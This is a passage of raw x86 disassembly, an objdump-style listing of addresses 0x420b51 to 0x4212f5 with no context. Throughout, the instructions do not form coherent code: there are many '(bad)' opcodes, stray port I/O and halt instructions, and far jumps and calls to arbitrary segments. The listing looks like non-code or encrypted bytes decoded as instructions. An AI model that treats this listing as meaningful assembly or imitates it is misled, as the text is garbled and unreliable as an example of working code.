  420b51:	jne    0x420b62
  420b53:	in     eax,dx
  420b54:	inc    ebx
  420b55:	push   esp
  420b56:	jl     0x420bd2
  420b58:	rcr    DWORD PTR fs:[ebx],0x8b
  420b5c:	(bad)  [eax]
  420b5e:	sbb    eax,0x680730fa
  420b63:	lods   al,BYTE PTR ds:[esi]
  420b64:	inc    ebx
  420b65:	sub    dl,ch
  420b67:	rcl    DWORD PTR ds:[ecx-0x53da5a7],0xe8
  420b6f:	lods   eax,DWORD PTR ds:[esi]
  420b70:	sbb    BYTE PTR [ebp+0x7d],al
  420b73:	push   ebx
  420b74:	pushf  
  420b75:	cmp    dh,BYTE PTR [ecx-0x3f99701]
  420b7b:	add    DWORD PTR [eax-0x19],eax
  420b7e:	or     eax,0xb3739f87
  420b83:	inc    edi
  420b84:	or     dl,bl
  420b86:	int3   
  420b87:	call   0xc4bdb028
  420b8c:	aaa    
  420b8d:	(bad)  
  420b8e:	out    0x3b,al
  420b90:	aam    0x88
  420b92:	out    0x41,eax
  420b94:	rol    DWORD PTR [edi+0x6884a632],cl
  420b9a:	push   es
  420b9b:	clc    
  420b9c:	ja     0x420b93
  420b9e:	jno    0x420c13
  420ba0:	in     al,dx
  420ba1:	rol    al,1
  420ba3:	push   edi
  420ba4:	jno    0x420b6a
  420ba6:	std    
  420ba7:	js     0x420b78
  420ba9:	jbe    0x420b7e
  420bab:	jecxz  0x420ba8
  420bad:	(bad)
  420bb1:	aam    0xb3
  420bb3:	shr    ch,1
  420bb5:	dec    esi
  420bb6:	inc    esp
  420bb7:	outs   dx,DWORD PTR ds:[esi]
  420bb8:	shr    BYTE PTR [ebp+0x425fdaeb],cl
  420bbe:	or     al,0xc0
  420bc0:	dec    edx
  420bc1:	pop    ebx
  420bc2:	call   0xe87eec77
  420bc7:	rol    BYTE PTR [edx+0x63],0x2b
  420bcb:	pop    esp
  420bcc:	jp     0x420be7
  420bce:	jp     0x420b5f
  420bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bd1:	jp     0x420b98
  420bd3:	mov    ds,WORD PTR [edx+0x46a3e169]
  420bd9:	sub    BYTE PTR [ecx],al
  420bdb:	mov    edx,0xb69f174b
  420be0:	das    
  420be1:	addr16 dec ecx
  420be3:	xor    eax,DWORD PTR [ebp+0x64]
  420be6:	in     al,dx
  420be7:	adc    al,0x78
  420be9:	jecxz  0x420c4c
  420beb:	out    0x10,al
  420bed:	xchg   esp,eax
  420bee:	nop
  420bef:	cmp    eax,0x4d63baa
  420bf4:	jp     0x420c56
  420bf6:	mov    ds:0x2630658c,eax
  420bfb:	cmp    ah,bh
  420bfd:	mov    dh,0xf1
  420bff:	sub    eax,0xd6993640
  420c04:	pop    ebp
  420c05:	mov    dh,0x13
  420c07:	sbb    DWORD PTR [ecx-0x5d],esi
  420c0a:	repz test dl,dl
  420c0d:	or     DWORD PTR [eax+0x48ad33c4],ebp
  420c13:	push   esp
  420c14:	fist   DWORD PTR [ecx-0x382b0122]
  420c1a:	add    al,0x62
  420c1c:	jle    0x420c77
  420c1e:	xor    al,0xd8
  420c20:	add    al,0x11
  420c22:	jb     0x420c97
  420c24:	or     DWORD PTR [edx-0x7e520e81],0xffffff8d
  420c2b:	call   0x767ae4e6
  420c30:	shl    DWORD PTR [edi],1
  420c32:	adc    bh,BYTE PTR [ecx]
  420c34:	aas    
  420c35:	cmp    DWORD PTR [esi],ecx
  420c37:	dec    edi
  420c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c39:	pop    esp
  420c3a:	cdq    
  420c3b:	scas   al,BYTE PTR es:[edi]
  420c3c:	test   al,0x46
  420c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c3f:	shl    dl,1
  420c41:	aad    0xf4
  420c43:	popf   
  420c44:	pop    ebp
  420c45:	rol    DWORD PTR [esi+0xd],0x70
  420c49:	leave  
  420c4a:	mov    eax,ds:0xbeadb151
  420c4f:	(bad)  
  420c50:	pop    edx
  420c51:	and    DWORD PTR [eax+0x70],eax
  420c54:	add    al,BYTE PTR [ebx+eax*2]
  420c57:	sub    ebx,edx
  420c59:	out    dx,eax
  420c5a:	inc    ebx
  420c5b:	pusha  
  420c5c:	fild   WORD PTR ds:0xfefc771c
  420c62:	and    eax,DWORD PTR [ebx]
  420c64:	jmp    0x3fd2:0xfcf62a8b
  420c6b:	jge    0x420c9f
  420c6d:	jecxz  0x420ca3
  420c6f:	sub    DWORD PTR [edi+0xd21845d],eax
  420c75:	fst    QWORD PTR [edi+ebp*2-0x3456f8b1]
  420c7c:	ror    DWORD PTR [eax+0x2d3a9735],1
  420c82:	adc    al,0xb6
  420c84:	xchg   ebp,eax
  420c85:	jnp    0x420cb5
  420c87:	daa    
  420c88:	sbb    DWORD PTR [esi-0x7d7dd068],0xf3b86ca4
  420c92:	pop    edx
  420c93:	sbb    esi,edi
  420c95:	jl     0x420cce
  420c97:	or     al,0x7f
  420c99:	out    0xfe,al
  420c9b:	push   es
  420c9c:	mov    esp,0x735220ca
  420ca1:	pop    ecx
  420ca2:	int    0x5b
  420ca4:	or     BYTE PTR [eax],cl
  420ca6:	mov    edi,0x8e79d552
  420cab:	imul   eax,DWORD PTR [ebx+0x6d60de5],0x9ba53b66
  420cb5:	and    cl,BYTE PTR [edx-0x3823df7e]
  420cbb:	cld    
  420cbc:	mov    bl,0x27
  420cbe:	fstp   TBYTE PTR [esp+ebx*1-0x70f3fbfa]
  420cc5:	pop    es
  420cc6:	dec    esp
  420cc7:	jno    0x420d1c
  420cc9:	or     DWORD PTR [ebx+ecx*8-0x5a],ecx
  420ccd:	xchg   edx,eax
  420cce:	jae    0x420cfa
  420cd0:	dec    ebx
  420cd1:	in     al,dx
  420cd2:	shr    DWORD PTR [ebp-0x4f],1
  420cd5:	sub    al,0x6f
  420cd7:	cmp    eax,0x5b689676
  420cdc:	pop    ds
  420cdd:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cdf:	in     al,0x4b
  420ce1:	push   ebx
  420ce2:	dec    esi
  420ce3:	scas   al,BYTE PTR es:[edi]
  420ce4:	rol    DWORD PTR [ecx+edx*8],1
  420ce7:	sub    BYTE PTR [edx+0x710da596],ah
  420ced:	loopne 0x420ca4
  420cef:	(bad)  
  420cf0:	xlat   BYTE PTR ds:[ebx]
  420cf1:	xor    bl,BYTE PTR [esi+0x2a1db9c8]
  420cf7:	jb     0x420d76
  420cf9:	or     eax,0x7c76b06f
  420cfe:	push   eax
  420cff:	fbld   TBYTE PTR [eax-0x60]
  420d02:	jns    0x420d20
  420d04:	pop    edi
  420d05:	jle    0x420d1d
  420d07:	out    0x30,eax
  420d09:	in     al,0xc8
  420d0b:	dec    ebp
  420d0c:	(bad)  
  420d0d:	mov    bh,0x88
  420d0f:	jo     0x420d86
  420d11:	sbb    dh,BYTE PTR [ebx]
  420d13:	aad    0xf5
  420d15:	xor    BYTE PTR [edx+0x4c629e48],cl
  420d1b:	fsubr  QWORD PTR [edx+ebp*1]
  420d1f:	mov    BYTE PTR [ebp+ebx*4-0x57],dl
  420d23:	out    0x8f,al
  420d25:	jb     0x420d84
  420d27:	sub    bl,bl
  420d29:	call   0x8febb91e
  420d2e:	leave  
  420d2f:	xor    al,0x86
  420d31:	aad    0x37
  420d33:	xchg   ch,ah
  420d35:	adc    DWORD PTR ds:0x4e3fece1,edx
  420d3b:	jb     0x420d88
  420d3d:	xchg   esp,eax
  420d3e:	mov    cl,bl
  420d40:	popa   
  420d41:	arpl   bx,cx
  420d43:	push   es
  420d44:	sahf   
  420d45:	test   al,0x9c
  420d47:	pop    ebx
  420d48:	arpl   WORD PTR [edi+0x6597896b],di
  420d4e:	das    
  420d4f:	es std 
  420d51:	mov    al,ds:0x437e776e
  420d56:	mov    edx,0x1e94ad22
  420d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d5c:	fild   WORD PTR [edi+eiz*1+0x1d]
  420d60:	mov    eax,0x6220bce2
  420d65:	adc    ebp,DWORD PTR ds:0x70aeae91
  420d6b:	cmp    ebp,DWORD PTR [ebx]
  420d6d:	push   esi
  420d6e:	adc    al,0x42
  420d70:	push   ecx
  420d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d72:	in     eax,dx
  420d73:	pop    es
  420d74:	xchg   DWORD PTR [ebx],esi
  420d76:	jnp    0x420db6
  420d78:	fistp  DWORD PTR [edx-0x15]
  420d7b:	fstp   TBYTE PTR [eax+0x6c44f7b3]
  420d81:	(bad)  
  420d82:	outs   dx,BYTE PTR ds:[esi]
  420d83:	push   ebx
  420d84:	loope  0x420d21
  420d86:	adc    DWORD PTR [edx+edi*1],ebp
  420d89:	sbb    bl,BYTE PTR [edi+0x4a]
  420d8c:	pop    edi
  420d8d:	loope  0x420daf
  420d8f:	repnz outs dx,BYTE PTR ds:[esi]
  420d91:	sbb    DWORD PTR [esi],esp
  420d93:	and    BYTE PTR [edx],ah
  420d95:	dec    esp
  420d96:	pusha  
  420d97:	lahf   
  420d98:	xchg   ecx,eax
  420d99:	and    eax,DWORD PTR [ecx]
  420d9b:	cwde   
  420d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d9d:	(bad)  
  420d9e:	jnp    0x420d52
  420da0:	cmp    eax,0xe3105ef2
  420da5:	popf   
  420da6:	inc    esi
  420da7:	inc    eax
  420da8:	aam    0x50
  420daa:	repnz mov cl,0xf9
  420dad:	jno    0x420dff
  420daf:	adc    cl,ch
  420db1:	sub    ch,BYTE PTR [ecx]
  420db3:	xor    al,0x8f
  420db5:	dec    esi
  420db6:	scas   eax,DWORD PTR es:[edi]
  420db7:	pop    edx
  420db8:	mov    esp,0x75687472
  420dbd:	cs jo  0x420d9d
  420dc0:	mov    ds:0xb7cff9c1,al
  420dc5:	pop    edx
  420dc6:	push   0x8ff4b7be
  420dcb:	xchg   ecx,eax
  420dcc:	xchg   ebp,eax
  420dcd:	(bad)  
  420dce:	jmp    0x420dd7
  420dd0:	vmptrld QWORD PTR [ebp+ecx*1+0xa333762]
  420dd8:	hlt    
  420dd9:	lods   al,BYTE PTR ds:[esi]
  420dda:	push   DWORD PTR fs:[ecx-0x13144ea5]
  420de1:	push   ds
  420de2:	xchg   esi,eax
  420de3:	add    edi,esi
  420de5:	in     eax,0xd7
  420de7:	scas   al,BYTE PTR es:[edi]
  420de8:	(bad)  
  420de9:	out    0xcb,al
  420deb:	shr    DWORD PTR [esi+eax*4-0x2],0x6c
  420df0:	call   0x94e47036
  420df5:	mov    ebx,0x3a393ee5
  420dfa:	stos   DWORD PTR es:[edi],eax
  420dfb:	test   DWORD PTR ds:0x157dd00f,ecx
  420e01:	mov    WORD PTR [esi+0x0],fs
  420e04:	idiv   BYTE PTR [ebp-0x3102f03c]
  420e0a:	xor    esp,DWORD PTR [esi]
  420e0c:	cmp    esi,DWORD PTR [eax-0x6f]
  420e0f:	xor    eax,0xd5f98caf
  420e14:	dec    ecx
  420e15:	iret   
  420e16:	mov    DWORD PTR [ebx],esi
  420e18:	fdiv   QWORD PTR [ebp+0x6ce7df7a]
  420e1e:	(bad)  
  420e1f:	out    dx,eax
  420e20:	dec    eax
  420e21:	aaa    
  420e22:	mov    WORD PTR [ecx-0x7e],?
  420e25:	repz retf 
  420e27:	add    eax,0xd7bc7db1
  420e2c:	out    dx,eax
  420e2d:	sbb    BYTE PTR [eax],0xde
  420e30:	cmp    dh,BYTE PTR [ebp+0x58]
  420e33:	mov    eax,0xc6523628
  420e38:	jbe    0x420dbd
  420e3a:	call   0x61b4:0x1a6560f5
  420e41:	es jle 0x420dc4
  420e44:	push   ecx
  420e45:	or     ebp,DWORD PTR [ebx+0x7fdb37b]
  420e4b:	into   
  420e4c:	mov    eax,ds:0xdd3226ea
  420e51:	dec    ecx
  420e52:	int    0x78
  420e54:	jnp    0x420e52
  420e56:	inc    edi
  420e57:	cmp    esp,DWORD PTR [ebp+0x3a]
  420e5a:	stos   BYTE PTR es:[edi],al
  420e5b:	add    ah,al
  420e5d:	push   es
  420e5e:	shl    BYTE PTR [ebp+0x4752a89f],0x99
  420e65:	xor    DWORD PTR [edx+esi*8],ecx
  420e68:	lock cs push eax
  420e6b:	inc    esi
  420e6c:	data16 int 0x2b
  420e6f:	js     0x420e6b
  420e71:	nop
  420e72:	jecxz  0x420e9a
  420e74:	lahf   
  420e75:	stc    
  420e76:	xchg   DWORD PTR [esi+0x59],edi
  420e79:	add    eax,0x8dda9c1a
  420e7e:	loopne 0x420e46
  420e80:	sub    BYTE PTR [ebp-0x22],cl
  420e83:	iret   
  420e84:	and    DWORD PTR [esi+0x76efe235],esp
  420e8a:	pop    ebp
  420e8b:	bound  di,DWORD PTR [edx-0x36]
  420e8f:	sbb    bh,BYTE PTR [ecx-0x62]
  420e92:	fld    QWORD PTR [edi+0x1]
  420e95:	sub    esp,DWORD PTR [ebx]
  420e97:	jb     0x420e8e
  420e99:	dec    ecx
  420e9a:	ins    BYTE PTR es:[edi],dx
  420e9b:	je     0x420e38
  420e9d:	js     0x420eb9
  420e9f:	lahf   
  420ea0:	jg     0x420e66
  420ea2:	mov    ebx,0xfb23736c
  420ea7:	inc    edx
  420ea8:	sbb    al,0xa2
  420eaa:	loop   0x420e64
  420eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ead:	push   eax
  420eae:	dec    ebp
  420eaf:	loop   0x420eba
  420eb1:	sahf   
  420eb2:	xor    DWORD PTR [ebp+eiz*1+0x24],0xffffffd1
  420eb7:	push   0x332f870c
  420ebc:	outs   dx,DWORD PTR ds:[esi]
  420ebd:	jle    0x420f18
  420ebf:	sub    eax,0xdc139627
  420ec4:	clc    
  420ec5:	jg     0x420ed2
  420ec7:	addr16 iret 
  420ec9:	call   0x8ef2:0xb53f7ced
  420ed0:	gs mov ah,0xc4
  420ed3:	nop
  420ed4:	out    dx,al
  420ed5:	shl    dh,1
  420ed7:	popf   
  420ed8:	mov    ah,0x65
  420eda:	ds das 
  420edc:	(bad)  
  420ede:	sbb    ebx,DWORD PTR [edx]
  420ee0:	sbb    BYTE PTR [ebx-0x24939e73],cl
  420ee6:	ds or  eax,0x9801c4c7
  420eec:	in     eax,0x22
  420eee:	ds (bad) 
  420ef0:	mov    esi,0xa8e0b1fa
  420ef5:	popa   
  420ef6:	(bad)
  420ef9:	add    bh,BYTE PTR [ebp-0x3276a48a]
  420eff:	stc    
  420f00:	pop    edx
  420f01:	imul   esp,DWORD PTR [edx-0x5255b122],0x65
  420f08:	mov    fs,WORD PTR [edx+eax*1]
  420f0b:	call   0x73e59b74
  420f10:	push   cs
  420f11:	xor    eax,0x32d1a504
  420f16:	stos   BYTE PTR es:[edi],al
  420f17:	dec    esp
  420f18:	retf   0x60e
  420f1b:	enter  0xfa06,0xeb
  420f1f:	or     dh,BYTE PTR [eax+ebx*1+0xa7fb139]
  420f26:	mov    BYTE PTR [ecx-0x6b],bh
  420f29:	icebp  
  420f2a:	retf   0x1597
  420f2d:	shr    BYTE PTR [edi],cl
  420f2f:	ret    
  420f30:	pop    edi
  420f31:	or     al,0xeb
  420f33:	push   ebx
  420f34:	push   edx
  420f35:	mov    edi,0x1820ca58
  420f3a:	mov    ebp,edi
  420f3c:	stos   DWORD PTR es:[edi],eax
  420f3d:	loopne 0x420f8a
  420f3f:	dec    edi
  420f40:	xor    eax,0xb1b35a0f
  420f45:	jmp    0x420eef
  420f47:	add    BYTE PTR [esi-0x5f3c79cf],dl
  420f4d:	icebp  
  420f4e:	test   eax,0x777bbc6e
  420f53:	in     al,dx
  420f54:	popa   
  420f55:	cmp    cl,dh
  420f57:	popf   
  420f58:	mov    ebp,0x5d1d676b
  420f5d:	mov    ds:0x3e272f06,eax
  420f62:	ins    DWORD PTR es:[edi],dx
  420f63:	fwait
  420f64:	add    ebp,DWORD PTR [edi+ebp*2]
  420f67:	cmp    edi,DWORD PTR [edi+0x6f]
  420f6a:	lahf   
  420f6b:	ds jg  0x420f4c
  420f6e:	xchg   edi,eax
  420f6f:	fst    DWORD PTR [eax-0x16ee4464]
  420f75:	lea    esp,[edx-0x25944228]
  420f7b:	xchg   edi,eax
  420f7c:	push   esp
  420f7d:	in     eax,0x2
  420f7f:	add    eax,0x13b6b08e
  420f84:	stos   DWORD PTR es:[edi],eax
  420f85:	cmp    BYTE PTR [edx-0x2a],0x71
  420f89:	pop    es
  420f8a:	pop    esi
  420f8b:	inc    ecx
  420f8c:	pop    es
  420f8d:	xor    ebp,DWORD PTR [esi]
  420f8f:	inc    edi
  420f91:	stos   DWORD PTR es:[edi],eax
  420f92:	jge    0x420ff4
  420f94:	mov    cl,0xc3
  420f96:	int    0x11
  420f98:	nop
  420f99:	les    ebx,FWORD PTR [edi]
  420f9b:	(bad)  
  420f9c:	das    
  420f9d:	stos   DWORD PTR es:[edi],eax
  420f9e:	loop   0x421011
  420fa0:	out    0x6,eax
  420fa2:	arpl   WORD PTR [ebp-0x66],si
  420fa5:	pop    ss
  420fa6:	sbb    DWORD PTR [ecx],ecx
  420fa8:	scas   eax,DWORD PTR es:[edi]
  420fa9:	xor    BYTE PTR [edi-0x426b9ca7],ah
  420faf:	jbe    0x420f33
  420fb1:	mov    edx,0x565a1159
  420fb6:	inc    ecx
  420fb7:	or     al,0x43
  420fb9:	call   0xb6a855e
  420fbe:	lahf   
  420fbf:	js     0x421026
  420fc1:	nop
  420fc2:	mov    ds:0x76ea2fe1,al
  420fc7:	outs   dx,BYTE PTR ds:[esi]
  420fc8:	leave  
  420fc9:	imul   esi,ebp,0x40
  420fcc:	inc    edx
  420fcd:	fsub   QWORD PTR [ebx]
  420fcf:	jne    0x420f54
  420fd1:	div    DWORD PTR [edi+ebx*2-0x436279d5]
  420fd8:	xchg   ecx,eax
  420fd9:	fsubr  DWORD PTR [ecx]
  420fdb:	nop    DWORD PTR [edi-0xb08c3b4]
  420fe2:	xor    BYTE PTR [eax-0x1f],0xbf
  420fe6:	cmc    
  420fe7:	icebp  
  420fe8:	jnp    0x420fdd
  420fea:	add    al,0xd2
  420fec:	xchg   eax,edx
  420fee:	test   eax,0x6a181c26
  420ff3:	aaa    
  420ff4:	add    DWORD PTR [eax+edx*2+0x15651c1a],esp
  420ffb:	call   FWORD PTR [eax-0x10]
  420ffe:	sub    edx,DWORD PTR [edi*4+0x7c850920]
  421005:	pop    ecx
  421006:	mov    bh,0x40
  421008:	and    al,0x88
  42100a:	seta   BYTE PTR [eax+0x4efeb95a]
  421011:	outs   dx,DWORD PTR ds:[esi]
  421012:	loopne 0x42100a
  421014:	and    edx,ecx
  421016:	in     al,dx
  421017:	je     0x421053
  421019:	out    0x32,al
  42101b:	xor    esp,DWORD PTR [ebp-0x6e017e76]
  421021:	pop    ecx
  421022:	push   ebp
  421023:	sub    edi,DWORD PTR [ecx-0x71]
  421026:	dec    DWORD PTR [ecx]
  421028:	(bad)  
  421029:	mov    cl,0x4b
  42102b:	jle    0x42103e
  42102d:	mov    dh,0x56
  42102f:	leave  
  421030:	dec    edi
  421031:	push   ebx
  421032:	xchg   ecx,eax
  421033:	cs jns 0x42105b
  421036:	int3   
  421037:	mov    eax,ds:0x321880c
  42103c:	ja     0x421091
  42103e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42103f:	or     al,0xef
  421041:	daa    
  421042:	xor    ecx,esi
  421044:	stc    
  421045:	cmovg  edx,DWORD PTR [edi+0x236f5af3]
  42104c:	mov    al,0x45
  42104e:	or     bl,ch
  421050:	(bad)  
  421051:	cmp    DWORD PTR [ebx],edi
  421053:	or     DWORD PTR [eax+0x124c7d7d],eax
  421059:	push   esi
  42105a:	dec    eax
  42105b:	and    ebp,ebx
  42105d:	xor    eax,0xc5e4f9c1
  421062:	pop    esp
  421063:	shl    BYTE PTR [ebx-0x5e],1
  421066:	std    
  421067:	push   edi
  421068:	and    DWORD PTR es:[edx],eax
  42106b:	jmp    DWORD PTR [edx-0x7c]
  42106e:	xor    ch,cl
  421070:	and    DWORD PTR [edx+0x21d3e533],edx
  421076:	or     bh,bh
  421078:	xchg   DWORD PTR [eax-0x10a9d082],ebp
  42107e:	mov    al,ds:0xd063056
  421083:	jo     0x421006
  421085:	push   es
  421086:	sti    
  421087:	push   ss
  421088:	out    dx,eax
  421089:	mov    esp,0xa5b9027b
  42108e:	cld    
  42108f:	fmulp  st(7),st
  421091:	fisttp DWORD PTR [edi+0x306ae41e]
  421097:	pop    ss
  421098:	lahf   
  421099:	pop    ebp
  42109a:	or     BYTE PTR [edi],cl
  42109c:	mov    eax,ds:0x28cf2364
  4210a1:	mov    ds:0x4db29880,eax
  4210a6:	mov    eax,ds:0x5bdeefee
  4210ab:	adc    bh,BYTE PTR [esi+0x9]
  4210ae:	mov    eax,ds:0xe9ef0175
  4210b3:	pop    ecx
  4210b4:	fwait
  4210b5:	stc    
  4210b6:	dec    edi
  4210b7:	enter  0x3867,0x97
  4210bb:	push   ebp
  4210bc:	adc    ebx,edi
  4210be:	xor    al,0x76
  4210c0:	or     ch,BYTE PTR [esi-0x1]
  4210c3:	arpl   WORD PTR [edi-0x18],dx
  4210c6:	repnz dec edi
  4210c8:	jbe    0x421128
  4210ca:	in     al,dx
  4210cb:	xlat   BYTE PTR ds:[ebx]
  4210cc:	outs   dx,BYTE PTR ds:[esi]
  4210cd:	push   ebp
  4210ce:	inc    ecx
  4210cf:	mov    cl,0x78
  4210d1:	ja     0x421063
  4210d3:	cwde   
  4210d4:	ret    
  4210d5:	and    ebx,DWORD PTR [ebx-0x6d]
  4210d8:	in     al,0x15
  4210da:	and    esi,esi
  4210dc:	stc    
  4210dd:	pop    esi
  4210de:	das    
  4210df:	mov    ebx,0xd92d88a0
  4210e4:	pop    DWORD PTR [ebx]
  4210e6:	inc    esp
  4210e7:	aaa    
  4210e8:	inc    ebp
  4210e9:	dec    ebp
  4210ea:	mov    esp,0xccb064e2
  4210ef:	fisttp QWORD PTR [edi-0x67]
  4210f2:	mov    esi,0xc685a132
  4210f7:	fstp   TBYTE PTR ds:0xe4ac2839
  4210fd:	imul   ebx,ebx,0x79c156cb
  421103:	xchg   BYTE PTR [ebx+esi*4],ch
  421106:	in     eax,dx
  421107:	cmp    eax,ecx
  421109:	loope  0x42108b
  42110b:	fsubrp st(6),st
  42110d:	jmp    0x4904:0xe351f133
  421114:	sar    BYTE PTR [ecx-0x5e],1
  421117:	fdiv   st,st(4)
  421119:	out    0x2b,eax
  42111b:	fs je  0x42114d
  42111e:	mov    ebx,esp
  421120:	icebp  
  421121:	mov    eax,0x25521e2f
  421126:	(bad)  
  421127:	jnp    0x421115
  421129:	aam    0xe9
  42112b:	test   BYTE PTR ds:0x54df6214,0x6d
  421132:	sbb    al,0x14
  421134:	add    esi,DWORD PTR [eax-0x28]
  421137:	lahf   
  421138:	pop    ebp
  42113a:	mov    ecx,0xf7753b39
  42113f:	into   
  421140:	pop    ebx
  421141:	(bad)  
  421142:	ja     0x421162
  421144:	mov    bh,0xa1
  421146:	dec    ecx
  421147:	stos   BYTE PTR es:[edi],al
  421148:	or     dl,BYTE PTR [edi]
  42114a:	adc    eax,0x99027180
  42114f:	inc    ebx
  421150:	inc    esp
  421151:	in     al,0x7d
  421153:	imul   esp,ebx,0xffffff98
  421156:	mov    bl,0x96
  421158:	mov    bh,0x55
  42115a:	bound  esp,QWORD PTR [ebx]
  42115c:	sub    ebx,edx
  42115e:	test   DWORD PTR ds:0xf98d6327,edx
  421164:	jmp    0x2c70810b
  421169:	or     al,0xde
  42116b:	je     0x4211b0
  42116d:	cmp    al,0xae
  42116f:	or     BYTE PTR [esi-0x68],ch
  421172:	or     DWORD PTR [ecx+0x67],ebp
  421175:	push   eax
  421176:	mov    esp,0x1dd60f75
  42117b:	aas    
  42117c:	pop    ds
  42117d:	pop    ds
  42117e:	or     al,0xf6
  421180:	cmp    ecx,DWORD PTR [eax+0xb3164a6]
  421186:	test   cl,al
  421188:	cwde   
  421189:	divps  xmm6,XMMWORD PTR [eax-0x985df78]
  421190:	in     eax,0x9a
  421192:	push   edi
  421193:	jl     0x42114d
  421195:	mov    cl,0x76
  421197:	neg    BYTE PTR [ebx+0x73]
  42119a:	pop    es
  42119b:	mov    bh,BYTE PTR [edi+eiz*8+0xc]
  42119f:	jne    0x4211c2
  4211a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211a2:	and    al,0xb5
  4211a4:	adc    ecx,DWORD PTR [ecx]
  4211a6:	scas   eax,DWORD PTR es:[edi]
  4211a7:	jecxz  0x42117b
  4211a9:	mov    bl,0x47
  4211ab:	inc    ecx
  4211ac:	call   0xcee29961
  4211b1:	jg     0x421223
  4211b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211b4:	mov    ds:0x9226a942,al
  4211b9:	les    ebp,FWORD PTR [eax+edi*2+0x2b]
  4211bd:	shr    DWORD PTR [ebx],cl
  4211bf:	adc    esi,DWORD PTR [eax+0x6c]
  4211c2:	or     BYTE PTR [eax-0x40e66b00],0xc9
  4211c9:	pusha  
  4211ca:	das    
  4211cb:	push   edi
  4211cc:	outs   dx,DWORD PTR ds:[esi]
  4211cd:	dec    esi
  4211ce:	push   cs
  4211cf:	jno    0x421200
  4211d1:	add    eax,0x3fa463a5
  4211d6:	mov    al,0x61
  4211d8:	mov    BYTE PTR [ebp-0x4f],bl
  4211db:	xchg   esi,eax
  4211dc:	jo     0x4211a9
  4211de:	jg     0x42117f
  4211e0:	jno    0x4211ff
  4211e2:	dec    ebp
  4211e3:	out    0xf2,al
  4211e5:	into   
  4211e6:	sbb    dl,BYTE PTR [eax-0x71438e4e]
  4211ec:	repz pushf 
  4211ee:	iret   
  4211ef:	call   0x80ad3e89
  4211f4:	dec    esp
  4211f5:	pop    ss
  4211f6:	pop    ax
  4211f8:	das    
  4211f9:	pushf  
  4211fa:	call   0x1985:0xc608b4b7
  421201:	(bad)  
  421202:	gs cmp eax,0x52be187c
  421208:	xor    bh,0xb5
  42120b:	sbb    DWORD PTR [ecx+0x5a],ecx
  42120e:	mov    WORD PTR ds:0x3fa3fa1b,gs
  421214:	jle    0x421271
  421216:	mov    dl,0xc
  421218:	push   eax
  421219:	dec    edx
  42121a:	stos   BYTE PTR es:[edi],al
  42121b:	add    BYTE PTR [edi],ch
  42121d:	scas   al,BYTE PTR es:[edi]
  42121e:	fwait
  42121f:	mov    bl,BYTE PTR [eax]
  421221:	stos   BYTE PTR es:[edi],al
  421222:	call   0x84:0xa49ce4fc
  421229:	jns    0x421291
  42122b:	jge    0x4211f0
  42122d:	jp     0x421231
  42122f:	inc    edi
  421230:	mov    esp,0x85ee553d
  421235:	fcmovnu st,st(3)
  421237:	inc    DWORD PTR [edi+0x21]
  42123a:	addr16 sbb eax,0xff36d0c1
  421240:	jns    0x421274
  421242:	lods   eax,DWORD PTR ds:[esi]
  421243:	imul   esi,DWORD PTR [edi],0x44e95494
  421249:	(bad)  
  42124a:	push   esp
  42124b:	mov    ch,bl
  42124d:	jbe    0x421263
  42124f:	in     eax,0xe
  421251:	pushf  
  421252:	and    eax,DWORD PTR [esi+0x47]
  421255:	mov    edx,0x58a9d3be
  42125a:	fs into 
  42125c:	dec    ebp
  42125d:	mov    cl,BYTE PTR [ebp+0x34]
  421260:	(bad)  
  421261:	jmp    0x4212b4
  421263:	pop    es
  421264:	jle    0x42123b
  421266:	mov    ds:0x1e0ba827,eax
  42126b:	mov    al,0xb1
  42126d:	in     eax,dx
  42126e:	out    0x8,eax
  421270:	inc    esp
  421271:	jg     0x42124f
  421273:	gs test al,0x8f
  421276:	das    
  421277:	enter  0x8932,0x4
  42127b:	out    dx,eax
  42127c:	ret    
  42127d:	test   BYTE PTR [ecx-0x19339c42],dl
  421283:	xchg   esi,eax
  421284:	mov    dl,0x8b
  421286:	inc    ecx
  421287:	adc    DWORD PTR ds:0xe0983c0d,eax
  42128d:	lahf   
  42128e:	(bad)  
  42128f:	ins    DWORD PTR es:[edi],dx
  421290:	jmp    0x9df57e38
  421295:	imul   edi,DWORD PTR [edi+0x3be3517f],0x4d
  42129c:	cld    
  42129d:	sbb    esi,DWORD PTR [ecx-0x7c]
  4212a0:	iret   
  4212a1:	xchg   esi,eax
  4212a2:	test   DWORD PTR [edi-0x91f0e10],ebx
  4212a8:	sub    ebx,DWORD PTR [eax]
  4212aa:	(bad)  
  4212ab:	xchg   ebp,eax
  4212ac:	inc    ecx
  4212ad:	cmp    ah,BYTE PTR gs:[ebx-0x3a]
  4212b1:	or     eax,0x44342c2b
  4212b6:	and    BYTE PTR [ecx-0x12],cl
  4212b9:	sbb    al,0x15
  4212bb:	dec    edx
  4212bc:	jle    0x421299
  4212be:	pop    eax
  4212bf:	xchg   ebp,eax
  4212c0:	xor    BYTE PTR [ebp+0x75],bh
  4212c3:	xchg   BYTE PTR [ecx+0x26],dh
  4212c6:	dec    esi
  4212c7:	sbb    dh,ah
  4212c9:	dec    eax
  4212ca:	xchg   ebp,eax
  4212cb:	pushf  
  4212cc:	and    bl,BYTE PTR [edx+edi*2-0x6b]
  4212d0:	nop
  4212d1:	hlt    
  4212d2:	mov    ds:0x95028980,eax
  4212d7:	mov    cl,0x9c
  4212d9:	bound  ebp,QWORD PTR [esi+0x331f5bb7]
  4212df:	cdq    
  4212e0:	xchg   ecx,eax
  4212e1:	std    
  4212e2:	xchg   BYTE PTR [esi-0x34],cl
  4212e5:	scas   eax,DWORD PTR es:[edi]
  4212e6:	sub    ebp,DWORD PTR [edi]
  4212e8:	js     0x421308
  4212ea:	shl    BYTE PTR [edx-0x2e99259],cl
  4212f0:	push   ecx
  4212f1:	fst    DWORD PTR [esi]
  4212f3:	xchg   edi,eax
  4212f4:	xchg   esi,eax
  4212f5:	daa    
